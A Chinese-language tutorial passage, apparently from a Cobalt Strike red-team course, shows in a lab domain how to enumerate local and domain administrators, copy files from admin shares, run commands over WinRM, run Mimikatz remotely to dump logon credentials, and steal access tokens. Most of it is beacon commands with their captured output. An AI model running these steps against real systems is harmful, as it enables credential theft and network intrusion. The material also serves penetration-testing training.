<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net view</span><br><span class="line">[*] Tasked beacon to run net view</span><br><span class="line">[+] host called home, sent: <span class="number">104504</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">List of hosts:</span><br><span class="line">Server Name             IP Address                       Platform  Version  <span class="built_in">Type</span>   Comment</span><br><span class="line"><span class="literal">-----------</span>             <span class="literal">----------</span>                       <span class="literal">--------</span>  <span class="literal">-------</span>  <span class="literal">----</span>   <span class="literal">-------</span></span><br><span class="line">WIN<span class="literal">-P2AASSD1AF1</span>         <span class="number">192.168</span>.<span class="number">15.124</span>                   <span class="number">500</span>       <span class="number">6.1</span>      PDC    </span><br></pre></td></tr></table></figure>



<h6 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a><strong>用户枚举</strong></h6><p>用户枚举的三个关键步骤：</p>
<p>1、当前账号是否为管理员账号？</p>
<p>2、哪些账号是域管理员账号？</p>
<p>3、哪个账号是这个系统上的本地管理员账号？</p>
<p><strong>管理员账号</strong> </p>
<p>第一个关键步骤，发现管理员账号。</p>
<p>如果想知道自己是否为管理员账号，可以尝试运行一些只有管理员账号才有权限操作的命令，然后通过返回结果判断是否为管理员。</p>
<p>其中一种方式是尝试列出仅仅只有管理员才能查看的共享列表，比如下面的 <code>dir \\host\C$</code> 命令，如果可以看到一个文件列表，那么说明可能拥有本地管理员权限。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\host\C<span class="variable">$</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#管理员账号运行结果</span></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WinDC\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WinDC\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">06</span>/<span class="number">24</span>  <span class="number">09</span>:<span class="number">29</span>    &lt;<span class="built_in">DIR</span>&gt;          inetpub</span><br><span class="line"><span class="number">2009</span>/<span class="number">07</span>/<span class="number">14</span>  <span class="number">11</span>:<span class="number">20</span>    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件              <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">6</span> 个目录 <span class="number">28</span>,<span class="number">500</span>,<span class="number">807</span>,<span class="number">680</span> 可用字节</span><br><span class="line"></span><br><span class="line"><span class="comment">#一般账号运行结果</span></span><br><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>

<p>也可以运行其他命令，比如运行下面的 <code>at</code> 命令来查看系统上的计划任务列表，如果显示出了任务列表信息，那么可能是本地管理员。（当任务列表没有信息时会返回 “列表是空的” 提示）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">shell at \\host</span><br><span class="line"></span><br><span class="line"><span class="comment">#管理员账号运行结果</span></span><br><span class="line">beacon&gt; shell at \\WinDC</span><br><span class="line">[*] Tasked beacon to run: at \\WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">51</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">状态 ID     日期                    时间          命令行</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">        <span class="number">1</span>   今天                    <span class="number">22</span>:<span class="number">30</span>         E:\Install\Thunder\Thunder.exe</span><br><span class="line"></span><br><span class="line"><span class="comment">#一般账号运行结果</span></span><br><span class="line">beacon&gt; shell at \\WinDC</span><br><span class="line">[*] Tasked beacon to run: at \\WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">51</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">拒绝访问。</span><br></pre></td></tr></table></figure>

<p>在上一节讲述的 <code>PowerView</code> 有很多很好的自动操作来帮助解决这些问题。可以在加载 <code>PowerView</code> 后，运行下面的命令，通过 <code>PowerView</code> 可以快速找到管理员账号</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line"></span><br><span class="line">beacon&gt; powershell<span class="literal">-import</span> powerview.ps1</span><br><span class="line">[*] Tasked beacon to import: powerview.ps1</span><br><span class="line">[+] host called home, sent: <span class="number">101224</span> bytes</span><br><span class="line"></span><br><span class="line">beacon&gt; powershell <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Find-LocalAdminAccess</span></span><br><span class="line">[+] host called home, sent: <span class="number">329</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">WinDC.teamssix.com</span><br></pre></td></tr></table></figure>



<p><strong>域管理员账号</strong></p>
<p>第二个关键步骤，发现域管理员账号。</p>
<p><strong>列出域管理员</strong></p>
<p>对于发现域管理员账号，可以在共享里使用本地的Windows命令。运行以下两条命令可以用来找出这些“域群组”的成员。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /DOMAIN</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /DOMAIN</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /domain</span><br><span class="line">[*] Tasked beacon to run: net <span class="built_in">group</span> <span class="string">&quot;enterprise admins&quot;</span> /domain</span><br><span class="line">[+] host called home, sent: <span class="number">68</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">组名     Enterprise Admins</span><br><span class="line">注释     企业的指定系统管理员</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[*] Tasked beacon to run: net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br><span class="line">[+] host called home, sent: <span class="number">64</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">组名     Domain Admins</span><br><span class="line">注释     指定的域管理员</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator            </span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<p>或者运行下面的命令来看谁是域控制器上的管理员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup <span class="string">&quot;administrators&quot;</span> /DOMAIN</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell net localgroup <span class="string">&quot;administrators&quot;</span> /domain</span><br><span class="line">[*] Tasked beacon to run: net localgroup <span class="string">&quot;administrators&quot;</span> /domain</span><br><span class="line">[+] host called home, sent: <span class="number">70</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">别名     administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">administrator</span><br><span class="line">Domain Admins</span><br><span class="line">Daniel</span><br><span class="line">Enterprise Admins</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>



<p><strong>Net 模块</strong></p>
<p>beacon 的 net 模块也可以帮助我们，下面的命令中 <code>TARGET</code> 的意思是一个域控制器或者是任何想查看的组名，比如企业管理员、域管理员等等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net <span class="built_in">group</span> \\TARGET <span class="built_in">group</span> name</span><br></pre></td></tr></table></figure>

<p>也可以运行下面的命令，这会连接任意目标来获取列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup \\TARGET <span class="built_in">group</span> name</span><br></pre></td></tr></table></figure>



<p><strong>本地管理员</strong></p>
<p><strong>Net 模块</strong></p>
<p>本地管理员可能是一个域账户，因此如果想把一个系统作为目标，应该找到谁是这个系统的本地管理员，因为如果获得了它的密码哈希值或者凭据就可以伪装成那个用户。</p>
<p>beacon 的 net 模块可以在系统上从一个没有特权的关联中查询本地组和用户。</p>
<p>在 beacon 控制台中运行下面命令可以获得一个目标上的群组列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup \\TARGET</span><br></pre></td></tr></table></figure>

<p>如果想获取群组的列表，可运行下面的命令来获得一个群组成员的名单列表。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup \\TARGET <span class="built_in">group</span> name</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; net localgroup \\WinDC administrators</span><br><span class="line">[*] Tasked beacon to run net localgroup administrators on WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">104510</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">Members of administrators on \\WinDC:</span><br><span class="line">TEAMSSIX\Administrator</span><br><span class="line">TEAMSSIX\Daniel</span><br><span class="line">TEAMSSIX\Enterprise Admins</span><br><span class="line">TEAMSSIX\Domain Admins</span><br></pre></td></tr></table></figure>



<p><strong>PowerView 模块</strong></p>
<p>PowerView 使用下面的命令能够在一个主机上找到本地管理员，这条命令实际上通过管理员群组找到同样的群组并且把成员名单返回出来。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Netlocalgroup</span> <span class="literal">-hostname</span> TARGET</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Get-Netlocalgroup</span> <span class="literal">-Hostname</span> WinDC</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Get-Netlocalgroup</span> <span class="literal">-Hostname</span> WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">385</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">ComputerName : WinDC</span><br><span class="line">AccountName  : teamssix.com/Administrator</span><br><span class="line">IsDomain     : True</span><br><span class="line">IsGroup      : False</span><br><span class="line">SID          : S<span class="literal">-1-5-22-3301978333-983314215-684642015-500</span></span><br><span class="line">Description  : </span><br><span class="line">Disabled     : </span><br><span class="line">LastLogin    : <span class="number">2020</span>/<span class="number">8</span>/<span class="number">17</span> <span class="number">22</span>:<span class="number">21</span>:<span class="number">23</span></span><br><span class="line">PwdLastSet   : </span><br><span class="line">PwdExpired   : </span><br><span class="line">UserFlags    : </span><br><span class="line"></span><br><span class="line">ComputerName : WinDC</span><br><span class="line">AccountName  : teamssix.com/Daniel</span><br><span class="line">……内容过多，余下部分省略……</span><br></pre></td></tr></table></figure>



<h6 id="无需恶意软件"><a href="#无需恶意软件" class="headerlink" title="无需恶意软件"></a>无需恶意软件</h6><p>如果一个系统信任我们为本地管理员权限，那么我们可以在那个系统上干什么呢？</p>
<p><strong>查看共享文件</strong></p>
<p>比如我们可以通过运行下面的命令来列出 C:\foo 的共享文件</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> \\host\C<span class="variable">$</span>\foo</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> \\WinDC\C<span class="variable">$</span></span><br><span class="line">[+] host called home, sent: <span class="number">55</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 \\WinDC\C<span class="variable">$</span> 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 F269<span class="literal">-89A7</span></span><br><span class="line"> \\WinDC\C<span class="variable">$</span> 的目录</span><br><span class="line"><span class="number">2020</span>/<span class="number">06</span>/<span class="number">24</span>  <span class="number">09</span>:<span class="number">29</span>    &lt;<span class="built_in">DIR</span>&gt;          inetpub</span><br><span class="line"><span class="number">2009</span>/<span class="number">07</span>/<span class="number">14</span>  <span class="number">11</span>:<span class="number">20</span>    &lt;<span class="built_in">DIR</span>&gt;          PerfLogs</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">24</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">16</span>  <span class="number">21</span>:<span class="number">52</span>    &lt;<span class="built_in">DIR</span>&gt;          Program Files (x86)</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">17</span>  <span class="number">23</span>:<span class="number">00</span>    &lt;<span class="built_in">DIR</span>&gt;          Users</span><br><span class="line"><span class="number">2020</span>/<span class="number">07</span>/<span class="number">26</span>  <span class="number">00</span>:<span class="number">55</span>    &lt;<span class="built_in">DIR</span>&gt;          Windows</span><br><span class="line">               <span class="number">0</span> 个文件              <span class="number">0</span> 字节</span><br><span class="line">               <span class="number">6</span> 个目录 <span class="number">28</span>,<span class="number">500</span>,<span class="number">393</span>,<span class="number">984</span> 可用字节</span><br></pre></td></tr></table></figure>

<p><strong>复制文件</strong></p>
<p>比如运行下面的命令将 <code>secrets.txt</code>文件复制到当前目录。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">copy</span> \\host\C<span class="variable">$</span>\foo\secrets.txt</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">copy</span> \\WinDC\C<span class="variable">$</span>\foo\secrets.txt</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">copy</span> \\WinDC\C<span class="variable">$</span>\foo\secrets.txt</span><br><span class="line">[+] host called home, sent: <span class="number">93</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">已复制         <span class="number">1</span> 个文件。</span><br></pre></td></tr></table></figure>

<p><strong>查看文件列表</strong></p>
<p>比如运行下面的命令。其中 &#x2F;S 表示列出指定目录及子目录所有文件，&#x2F;B 表示使用空格式，即没有标题或摘要信息。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell <span class="built_in">dir</span> /S /B \\host\C<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; shell <span class="built_in">dir</span> /S /B \\WinDC\C<span class="variable">$</span>\Users</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">dir</span> /S /B \\WinDC\C<span class="variable">$</span>\Users</span><br><span class="line">[+] host called home, sent: <span class="number">67</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\Classic .NET AppPool</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\Daniel</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\Public</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Contacts</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Desktop</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Documents</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Downloads</span><br><span class="line">\\WinDC\C<span class="variable">$</span>\Users\administrator\Favorites</span><br><span class="line">……内容过多，余下部分省略……</span><br></pre></td></tr></table></figure>

<p><strong>使用 WinRM 运行命令</strong></p>
<p>WinRM 运行在 5985 端口上，WinRM 是 Windows 远程管服务，使用 WinRM 可以使远程管理更容易一些。</p>
<p>如果想利用 WinRM 运行命令则可以使用下面的命令。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-ScriptBlock</span> &#123;command here&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> WinDC <span class="literal">-ScriptBlock</span> &#123; net localgroup administrators&#125;</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> WinDC <span class="literal">-ScriptBlock</span> &#123; net localgroup administrators&#125;</span><br><span class="line">[+] host called home, sent: <span class="number">303</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line">别名     administrators</span><br><span class="line">注释     管理员对计算机/域有不受限制的完全访问权</span><br><span class="line">成员</span><br><span class="line"><span class="literal">-------------------------------------------------------------------------------</span></span><br><span class="line">Administrator</span><br><span class="line">Domain Admins</span><br><span class="line">Daniel</span><br><span class="line">Enterprise Admins</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>

<p>注：如果命令运行失败可能是因为 WinRM 配置原因，可在 powershell 环境下运行 <code>winrm quickconfig</code>命令，输入 <code>y</code> 回车即可</p>
<p>命令运行后的结果，WinRM 也将通过命令行进行显示，因此可以使用 Powershell 的 Invoke 命令来作为远程工具，而不使用其他的恶意软件来控制系统。</p>
<p><strong>通过 WinRM 运行 Mimikatz</strong></p>
<p>更进一步，甚至可以使用 PowerSploit 来通过 WinRM 运行 Mimikatz，只需要先导入 Invoke-Mimikatz.ps1 文件，再执行以下命令即可</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell<span class="literal">-import</span> /path/to/<span class="built_in">Invoke-Mimikatz</span>.ps1</span><br><span class="line">powershell <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> TARGET</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注：之前提了很多次的 PowerView 也是 PowerSploit 项目里众多 ps1 文件之一，Mimikatz 的 ps1 文件在 PowerSploit 项目的 Exfiltration 目录下，PowerSploit 项目下载地址：<a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/">https://github.com/PowerShellMafia/PowerSploit/(opens new window)</a></p>
</blockquote>
<p>因为 beacon 上传文件大小限制在1MB，而 Invoke-Mimikatz.ps1 文件大小在 2 MB 多，因此直接运行 <code>powershell-import</code> 导入该文件会报错，这里可以选择使用 beacon 中的 upload 命令或者在当前会话的 File Browser 图形界面中上传该文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload C:\path\<span class="built_in">Invoke-Mimikatz</span>.ps1</span><br></pre></td></tr></table></figure>

<p>上传之后通过 dir 命令可以查看到文件被上传到了C盘下，之后可以运行以下命令来导入该文件。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">import-module</span> C:\<span class="built_in">Invoke-Mimikatz</span>.ps1</span><br></pre></td></tr></table></figure>

<p>最后再运行以下命令就能通过 WinRM 执行 Mimikatz 了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> TARGET</span><br></pre></td></tr></table></figure>

<p>如果提示<code>无法将“Invoke-Mimikatz”项识别为 cmdlet、函数……</code>，则可以将两条命令以分号合并在一起运行，即：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell import-module C:\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; powershell <span class="built_in">import-module</span> C:\<span class="built_in">Invoke-Mimikatz</span>.ps1 ; <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> WinDC</span><br><span class="line">[*] Tasked beacon to run: <span class="built_in">import-module</span> C:\<span class="built_in">Invoke-Mimikatz</span>.ps1 ; <span class="built_in">Invoke-Mimikatz</span> <span class="literal">-ComputerName</span> WinDC</span><br><span class="line">[+] host called home, sent: <span class="number">287</span> bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot;</span></span><br><span class="line"> <span class="comment">## / \ ##  /* * *</span></span><br><span class="line"> <span class="comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>   http://blog.gentilkiwi.com/mimikatz             (oe.eo)</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>                                     with <span class="number">20</span> modules * * */</span><br><span class="line"></span><br><span class="line">mimikatz(powershell) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">314628</span> (<span class="number">00000000</span>:<span class="number">0004</span>cd04)</span><br><span class="line">Session           : Interactive from <span class="number">1</span></span><br><span class="line">User Name         : administrator</span><br><span class="line">Domain            : TEAMSSIX</span><br><span class="line">Logon Server      : WinDC</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">8</span>/<span class="number">20</span> <span class="number">23</span>:<span class="number">53</span>:<span class="number">08</span></span><br><span class="line">SID               : S<span class="literal">-1-5-22-3301978333-983314215-684642015-500</span></span><br><span class="line">	msv :	</span><br><span class="line">	 [<span class="number">00000003</span>] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">……内容过多，余下部分省略……</span><br></pre></td></tr></table></figure>



<h6 id="获取信任"><a href="#获取信任" class="headerlink" title="获取信任"></a>获取信任</h6><p>如果当前账号权限被系统认为是本地管理员权限，那么就可以执行很多管理员才能做的事，接下来就来看一下这样的一个过程是如何工作的，其中会涉及到以下要点：</p>
<p>1、<code>Access Token</code> 登录令牌</p>
<p>2、<code>Credentials</code> 凭证</p>
<p>3、<code>Password Hashes</code> 密码哈希</p>
<p>4、<code>Kerberos Tickets</code> 登录凭据</p>
<p><strong>登录令牌</strong> </p>
<ul>
<li>登录令牌在登录之后被创建</li>
<li>与每个进程和线程相关联</li>
<li>包括：<ul>
<li>用户和用户组的信息</li>
<li>本地计算机上的特权列表</li>
<li>限制（删除用户和用户组的权限）</li>
<li>参考凭证（支持单点登录）</li>
</ul>
</li>
<li>一直保存在内存中，直到系统重启</li>
</ul>
<p><em>以下是令牌窃取的过程：</em></p>
<ul>
<li>使用 <code>ps</code> 列出进程</li>
<li>使用 <code>steal_token [pid]</code> 窃取令牌</li>
<li>使用 <code>getuid</code> 找到你是谁</li>
<li>使用 <code>rev2self</code> 移除令牌</li>
</ul>
